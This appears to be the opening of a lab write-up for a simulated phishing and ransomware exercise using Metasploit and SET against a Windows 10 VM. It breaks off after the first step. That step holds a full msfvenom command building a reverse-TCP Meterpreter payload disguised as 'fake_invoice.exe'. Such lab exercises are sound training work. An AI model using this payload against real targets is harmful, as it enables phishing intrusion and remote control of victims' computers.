# Attack Simulation - Phishing + Ransomware

## 🎯 Goal

Simulate a phishing attack and post-exploitation access using reverse shell (Meterpreter), followed by mock ransomware behavior.

---

## Tools Used
- Social Engineering Toolkit (SET)
- Metasploit Framework
- Windows 10 VM (victim)
- Kali Linux (attacker)

---

## Steps Performed

### 1. Create Phishing Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > fake_invoice.exe
